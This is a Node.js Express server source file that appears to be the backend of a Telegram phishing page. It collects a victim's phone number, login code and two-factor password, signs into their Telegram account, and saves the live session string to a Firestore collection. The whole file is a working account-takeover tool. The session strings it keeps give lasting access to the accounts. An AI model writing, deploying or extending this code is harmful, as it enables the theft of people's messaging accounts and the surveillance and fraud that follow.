require('dotenv').config();
const express = require('express');
const path = require('path');

const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');

const admin = require('firebase-admin');
const serviceAccount = require('./serviceAccountKey.json');

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

const db = admin.firestore();
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// ================= CONFIG =================
const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;

// ================= TEMP SESSION =================
const tempSessions = {};

// ================= HOME =================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ================= SEND OTP =================
app.post('/send-otp', async (req, res) => {
  let { phone } = req.body;

  try {
    phone = normalizePhone(phone);

    const client = new TelegramClient(
      new StringSession(''),
      apiId,
      apiHash,
      { connectionRetries: 5 }
    );

    await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phone,
        apiId,
        apiHash,
        settings: new Api.CodeSettings({})
      })
    );

    tempSessions[phone] = {
      client,
      phoneCodeHash: result.phoneCodeHash,
      createdAt: Date.now()
    };

    return res.json({ success: true });

  } catch (err) {
    console.error(err);
    return res.json({ success: false, message: err.message });
  }
});

// ================= LOGIN OTP =================
app.post('/login', async (req, res) => {
  let { phone, otp } = req.body;

  try {
    phone = normalizePhone(phone);

    const temp = tempSessions[phone];
    if (!temp) return res.json({ success: false, message: "Session expired" });

    const { client, phoneCodeHash } = temp;

    try {
      await client.signIn({
        phoneNumber: phone,
        phoneCode: String(otp),
        phoneCodeHash
      });

    } catch (err) {
      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
        return res.json({ requirePassword: true });
      }
      throw err;
    }

    // ✅ SUCCESS (NO 2FA)
    const sessionString = client.session.save();

    await saveToFirestore(phone, sessionString, "nopass");

    delete tempSessions[phone];

    return res.json({ success: true });

  } catch (err) {
    console.error(err);
    return res.json({ success: false, message: err.message });
  }
});

// ================= LOGIN 2FA =================
app.post('/login-password', async (req, res) => {
  let { phone, password } = req.body;

  try {
    phone = normalizePhone(phone);

    const temp = tempSessions[phone];
    if (!temp) return res.json({ success: false, message: "Session expired" });

    const { client } = temp;

    await client.signInWithPassword({
      password: String(password)
    });

    const sessionString = client.session.save();

    await saveToFirestore(phone, sessionString, "pass");

    delete tempSessions[phone];

    return res.json({ success: true });

  } catch (err) {
    console.error(err);
    return res.json({ success: false, message: err.message });
  }
});

// ================= SAVE FIRESTORE =================
async function saveToFirestore(phone, sessionString, has2FA) {
  await db.collection('telegram_sessions').doc(phone).set({
    phone,
    sessionString,
    has2FA,
    lastLogin: admin.firestore.FieldValue.serverTimestamp()
  });

  await db.collection('telegram_sessions')
    .doc(phone)
    .collection('logs')
    .add({
      status: "success",
      has2FA,
      timestamp: admin.firestore.FieldValue.serverTimestamp()
    });
}

// ================= PHONE FORMAT =================
function normalizePhone(phone) {
  phone = String(phone).trim();
  if (!phone.startsWith('+')) phone = '+855' + phone;
  return phone;
}

// ================= CLEAN SESSION (AUTO CLEAR) =================
setInterval(() => {
  const now = Date.now();

  Object.keys(tempSessions).forEach(phone => {
    if (now - tempSessions[phone].createdAt > 5 * 60 * 1000) {
      delete tempSessions[phone];
      console.log("🧹 Cleared session:", phone);
    }
  });
}, 60000);

// ================= START =================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
